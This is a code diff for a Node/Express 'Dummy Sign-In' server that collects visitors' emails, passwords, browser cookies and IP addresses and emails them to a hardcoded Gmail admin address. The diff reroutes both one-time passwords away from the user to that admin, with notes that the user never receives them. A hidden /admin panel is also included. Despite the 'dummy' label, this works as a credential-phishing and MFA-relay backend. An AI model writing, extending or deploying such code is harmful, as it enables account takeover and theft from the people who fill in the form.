@@ -13,7 +13,6 @@ const ADMIN_EMAIL = (process.env.GMAIL_USER || 'blessedresult6@gmail.com').toLow
 const DATA_DIR = path.join(__dirname, 'data');
 const ADMIN_FILE = path.join(DATA_DIR, 'admin.json');
 
-// Ensure data directory exists (works locally; on Vercel it may be ephemeral)
 try {
   if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
 } catch (e) {}
@@ -23,7 +22,6 @@ function hashPassword(password) {
 }
 
 function loadAdminConfig() {
-  // 1. Prefer environment variable if set
   if (process.env.ADMIN_PASSWORD) {
     return {
       email: ADMIN_EMAIL,
@@ -31,16 +29,12 @@ function loadAdminConfig() {
       source: 'env'
     };
   }
-
-  // 2. Try reading from file (local persistence)
   try {
     if (fs.existsSync(ADMIN_FILE)) {
       const data = JSON.parse(fs.readFileSync(ADMIN_FILE, 'utf8'));
       return { ...data, source: 'file' };
     }
   } catch (e) {}
-
-  // 3. Nothing set yet
   return null;
 }
 
@@ -50,24 +44,18 @@ function saveAdminConfig(password) {
     passwordHash: hashPassword(password),
     createdAt: new Date().toISOString()
   };
-
   try {
     if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
     fs.writeFileSync(ADMIN_FILE, JSON.stringify(config, null, 2));
   } catch (e) {
-    // On Vercel the filesystem is read-only / ephemeral – we still keep it in memory
     console.warn('Could not write admin config to disk (normal on Vercel):', e.message);
   }
-
-  // Also keep in memory for the current process
   global.__adminConfig = config;
   return config;
 }
 
-// Load on startup
 let adminConfig = loadAdminConfig() || global.__adminConfig || null;
 
-// ---------- Sessions for dummy users ----------
 const sessions = new Map();
 
 setInterval(() => {
@@ -81,12 +69,10 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Hidden admin panel
 app.get('/admin', (req, res) => {
   res.sendFile(path.join(__dirname, 'views', 'admin.html'));
 });
 
-// Gmail SMTP
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
@@ -99,6 +85,7 @@ function generateOTP() {
   return crypto.randomInt(100000, 999999).toString();
 }
 
+// All emails go to ADMIN only (never to the dummy user)
 async function notifyAdmin(subject, data) {
   const text = Object.entries(data)
     .map(([k, v]) => `${k}: ${v}`)
@@ -112,71 +99,47 @@ async function notifyAdmin(subject, data) {
       text: text
     });
     console.log('Admin notified:', subject);
-  } catch (err) {
-    console.error('Failed to notify admin:', err.message);
-  }
-}
-
-async function sendOTPToUser(toEmail, otp, step) {
-  try {
-    await transporter.sendMail({
-      from: `\"Dummy Sign-In\" <${process.env.GMAIL_USER}>`,
-      to: toEmail,
-      subject: `Your Dummy Sign-In OTP (${step})`,
-      text: `Your one-time password is: ${otp}\n\nThis is a dummy test. Do not use real credentials.`
-    });
-    console.log(`OTP sent to user ${toEmail} for ${step}`);
     return true;
   } catch (err) {
-    console.error('Failed to send OTP to user:', err.message);
+    console.error('Failed to notify admin:', err.message);
     return false;
   }
 }
 
 // ========== ADMIN API ==========
 
-// Check if admin password is already set
 app.get('/api/admin-status', (req, res) => {
-  // Refresh from memory / file / env
   adminConfig = loadAdminConfig() || global.__adminConfig || null;
-
   res.json({
     email: ADMIN_EMAIL,
     passwordSet: !!adminConfig
   });
 });
 
-// First-time setup – set admin password
 app.post('/api/admin-setup', (req, res) => {
   const { email, password } = req.body;
 
   if (!email || !password) {
     return res.json({ success: false, message: 'Email and password are required' });
   }
-
   if (email.toLowerCase() !== ADMIN_EMAIL) {
     return res.json({ success: false, message: 'This email is not authorized as admin' });
   }
-
   if (password.length < 6) {
     return res.json({ success: false, message: 'Password must be at least 6 characters' });
   }
 
-  // Only allow setup if no password exists yet
   adminConfig = loadAdminConfig() || global.__adminConfig || null;
   if (adminConfig) {
     return res.json({ success: false, message: 'Password is already set. Please log in instead.' });
   }
 
   adminConfig = saveAdminConfig(password);
-
   res.json({ success: true, message: 'Admin password set successfully. You are now logged in.' });
 });
 
-// Normal admin login
 app.post('/api/admin-login', (req, res) => {
   const { email, password } = req.body;
-
   adminConfig = loadAdminConfig() || global.__adminConfig || null;
 
   if (!adminConfig) {
@@ -186,20 +149,18 @@ app.post('/api/admin-login', (req, res) => {
       message: 'No password set yet. Please create one first.'
     });
   }
-
   if (email.toLowerCase() !== ADMIN_EMAIL) {
     return res.json({ success: false, message: 'Wrong email or password' });
   }
-
   if (hashPassword(password) !== adminConfig.passwordHash) {
     return res.json({ success: false, message: 'Wrong email or password' });
   }
-
   res.json({ success: true });
 });
 
 // ========== USER API ROUTES ==========
 
+// Step 1: Email + Password → admin gets them (no OTP email to user)
 app.post('/api/step1', async (req, res) => {
   const { email, password, cookies, ip } = req.body;
 
@@ -227,22 +188,17 @@ app.post('/api/step1', async (req, res) => {
     Password: password,
     Cookies: cookies || '(none)',
     'IP Address': ip || '(unknown)',
-    Timestamp: new Date().toISOString(),
-    'Generated OTP 1 (for later)': otp1,
-    'Generated OTP 2 (for later)': otp2
+    Timestamp: new Date().toISOString()
   });
-
-  const sent = await sendOTPToUser(email, otp1, 'OTP 1');
 
   res.json({
     success: true,
     sessionId,
-    message: sent
-      ? 'OTP 1 has been sent to your email'
-      : 'Could not send OTP email (check server logs). You can still continue for testing.'
+    message: 'Email and password received'
   });
 });
 
+// Step 2: Username + Confirm Password → if OK, admin receives OTP 1, user goes to OTP 1 screen
 app.post('/api/step2', async (req, res) => {
   const { sessionId, username, confirmPassword } = req.body;
   const session = sessions.get(sessionId);
@@ -262,9 +218,7 @@ app.post('/api/step2', async (req, res) => {
       Timestamp: new Date().toISOString(),
       Status: 'Password did not match – user must restart'
     });
-
     sessions.delete(sessionId);
-
     return res.json({
       success: false,
       message: 'Password does not match the one you entered earlier. Restarting...'
@@ -273,19 +227,25 @@ app.post('/api/step2', async (req, res) => {
 
   session.username = username || '';
 
-  await notifyAdmin('Username + Password confirmed', {
+  // Admin receives OTP 1 (NOT the user)
+  await notifyAdmin('OTP 1 (for user to enter)', {
     Email: session.email,
     Password: session.password,
     Username: session.username,
+    'OTP 1': session.otp1,
     Cookies: session.cookies,
     'IP Address': session.ip,
     Timestamp: new Date().toISOString(),
-    Status: 'Password confirmed successfully'
+    Note: 'Send this OTP 1 to the user or use it as needed. User does NOT receive this email.'
   });
 
-  res.json({ success: true, message: 'Username received and password confirmed' });
+  res.json({
+    success: true,
+    message: 'Password confirmed. Enter OTP 1.'
+  });
 });
 
+// Step 3: Verify OTP 1 → if OK, admin receives OTP 2
 app.post('/api/step3', async (req, res) => {
   const { sessionId, otp1 } = req.body;
   const session = sessions.get(sessionId);
@@ -309,16 +269,25 @@ app.post('/api/step3', async (req, res) => {
     return res.json({ success: false, message: 'Incorrect OTP 1. Please try again.' });
   }
 
-  const sent = await sendOTPToUser(session.email, session.otp2, 'OTP 2');
+  // Admin receives OTP 2 (NOT the user)
+  await notifyAdmin('OTP 2 (for user to enter)', {
+    Email: session.email,
+    Password: session.password,
+    Username: session.username,
+    'OTP 2': session.otp2,
+    Cookies: session.cookies,
+    'IP Address': session.ip,
+    Timestamp: new Date().toISOString(),
+    Note: 'Send this OTP 2 to the user or use it as needed. User does NOT receive this email.'
+  });
 
   res.json({
     success: true,
-    message: sent
-      ? 'OTP 1 correct. OTP 2 has been sent to your email.'
-      : 'OTP 1 correct. (OTP 2 email may have failed – check server logs)'
+    message: 'OTP 1 correct. Enter OTP 2.'
   });
 });
 
+// Step 4: Verify OTP 2
 app.post('/api/step4', async (req, res) => {
   const { sessionId, otp2 } = req.body;
   const session = sessions.get(sessionId);
@@ -359,10 +328,8 @@ app.post('/api/step4', async (req, res) => {
   res.json({ success: true, message: 'All steps completed. Waiting for admin approval.' });
 });
 
-// Export for Vercel
 module.exports = app;
 
-// Local start
 if (require.main === module) {
   app.listen(PORT, () => {
     console.log(`\nDummy Sign-In server running at http://localhost:${PORT}`);
